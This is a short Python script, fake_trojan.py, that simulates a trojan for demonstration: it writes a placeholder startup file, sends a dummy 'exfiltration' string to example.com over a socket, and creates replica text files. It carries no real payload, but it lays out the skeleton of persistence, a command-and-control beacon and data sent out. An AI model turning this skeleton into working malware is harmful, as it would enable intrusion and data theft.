# fake_trojan.py
import os
import time
import socket

def simulate_trojan():
    print("[+] Simulated Trojan started...")

    # Simulate persistence
    print("[*] Simulating persistence by writing to fake startup file...")
    with open("C:/fake_startup_location/fake_entry.txt", "w") as f:
        f.write("Simulated startup command")

    # Simulate command and control (C2) connection
    print("[*] Simulating contact with C2 server...")
    try:
        s = socket.socket()
        s.connect(("example.com", 80))  # Harmless dummy domain
        s.send(b"Simulated data exfiltration...\n")
        s.close()
    except Exception as e:
        print(f"[*] Failed to connect to C2: {e}")

    # Simulate file replication
    print("[*] Simulating replication...")
    for i in range(3):
        with open(f"replica_{i}.txt", "w") as f:
            f.write("This is a fake Trojan replica file.\n")

    print("[+] Simulated Trojan finished.")

if __name__ == "__main__":
    simulate_trojan()
